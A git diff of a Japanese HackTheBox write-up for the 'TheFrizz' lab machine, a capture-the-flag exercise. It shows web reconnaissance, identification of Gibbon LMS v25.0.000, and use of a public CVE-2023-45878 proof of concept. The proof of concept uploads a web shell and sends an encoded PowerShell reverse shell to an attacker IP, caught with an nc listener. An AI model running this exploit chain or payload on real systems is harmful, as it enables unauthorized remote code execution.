@@ -30,34 +30,66 @@ Open 10.129.232.168:61681
 
 
 ## STEP 2
+80番にアクセス  
+frizzdc.frizz.htbにリダイレクトされるっぽい
 ```sh
-└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://frizzdc.frizz.htb/FUZZ 
-
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
-
-       v2.1.0-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://frizzdc.frizz.htb/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
-________________________________________________
-
-home                    [Status: 301, Size: 345, Words: 22, Lines: 10, Duration: 263ms]
-Home                    [Status: 301, Size: 345, Words: 22, Lines: 10, Duration: 359ms]
-con                     [Status: 403, Size: 306, Words: 22, Lines: 10, Duration: 263ms]
-HOME                    [Status: 301, Size: 345, Words: 22, Lines: 10, Duration: 290ms]
-aux                     [Status: 403, Size: 306, Words: 22, Lines: 10, Duration: 288ms]
-prn                     [Status: 403, Size: 306, Words: 22, Lines: 10, Duration: 263ms]
-:: Progress: [29999/29999] :: Job [1/1] :: 121 req/sec :: Duration: [0:03:47] :: Errors: 1 ::
+└─$ curl http://10.129.232.168 
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>302 Found</title>
+</head><body>
+<h1>Found</h1>
+<p>The document has moved <a href="http://frizzdc.frizz.htb/home/">here</a>.</p>
+<hr>
+<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12 Server at 10.129.232.168 Port 80</address>
+</body></html>
 ```
+hostsを編集
+```sh
+└─$ tail -n1 /etc/hosts    
+10.129.232.168 frizzdc.frizz.htb
+```
+「frizzdc.frizz.htb/home/」にアクセス
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/TheFrizz_01.png">  
+「staff logoin」をクリックすると、別ページに移動した  
+このwebはgibbon v25.0.000で動作しているっぽい  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/TheFrizz_02.png">  
+gibbon v25.0.000はcve-2023-45878の対象であり、認証なしでrceが可能である  
+PoCをダウンロードして実行
+```sh
+└─$ wget -nv https://raw.githubusercontent.com/davidzzo23/CVE-2023-45878/refs/heads/main/CVE-2023-45878.py             
+2025-10-29 09:02:53 URL:https://raw.githubusercontent.com/davidzzo23/CVE-2023-45878/refs/heads/main/CVE-2023-45878.py [3697/3697] -> "CVE-2023-45878.py" [1]
+
+└─$ python3.13 CVE-2023-45878.py -h
+usage: CVE-2023-45878.py [-h] -t TARGET [-c COMMAND] [-s] [-i IP] [-p PORT]
+
+GibbonEdu Web Shell Exploit (CVE-2023-45878)
+
+options:
+  -h, --help            show this help message and exit
+  -t, --target TARGET   Target domain (e.g., frizzdc.frizz.htb)
+  -c, --command COMMAND
+                        Command to execute remotely
+  -s, --shell           Trigger PowerShell reverse shell
+  -i, --ip IP           Attacker IP for reverse shell (required with -s)
+  -p, --port PORT       Attacker port for reverse shell (required with -s)
+
+└─$ python3.13 CVE-2023-45878.py -t 10.129.232.168 -s -i 10.10.16.28 -p 4444
+[+] Uploading web shell as wahvsfrg.php...
+[+] Upload successful.
+[+] Sending PowerShell reverse shell payload to http://10.129.232.168/Gibbon-LMS/wahvsfrg.php
+[*] Make sure your listener is running: nc -lvnp 4444
+[+] Executing command on: http://10.129.232.168/Gibbon-LMS/wahvsfrg.php?cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand CgAgACAAIAAgACQAYwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEAMAAuADEAMAAuADEANgAuADIAOAAiACwANAA0ADQANAApADsACgAgACAAIAAgACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AAoAIAAgACAAIABbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AAoAIAAgACAAIAB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAAgACAAIAAgACAAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsACgAgACAAIAAgACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAKACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAKACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7AAoAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAKACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQA7AAoAIAAgACAAIAB9AAoAIAAgACAAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKACAAIAAgACAA
+[!] Error connecting to web shell: HTTPConnectionPool(host='10.129.232.168', port=80): Read timed out. (read timeout=5)
+```
+リバースシェル取得
+```sh
+└─$ rlwrap nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.28] from (UNKNOWN) [10.129.232.168] 55489
+
+PS C:\xampp\htdocs\Gibbon-LMS> whoami
+frizz\w.webservice
+```
+
+## STEP 3
